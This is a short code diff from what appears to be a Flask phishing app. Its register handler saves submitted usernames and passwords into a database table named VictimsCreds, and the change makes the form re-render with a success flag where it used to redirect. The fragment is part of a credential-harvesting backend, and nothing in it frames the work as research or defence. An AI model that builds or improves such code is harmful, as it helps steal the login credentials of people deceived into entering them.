@@ -14,7 +14,7 @@ def register():
         victimCreds = VictimsCreds(username=username, password=password)
         db.session.add(victimCreds)
         db.session.commit()
-        return redirect(url_for('register'))
-    return render_template('register.html')
+        return render_template('register.html', register=True)
+    return render_template('register.html', register=False)
 if __name__ == '__main__':
     app.run(debug=True)
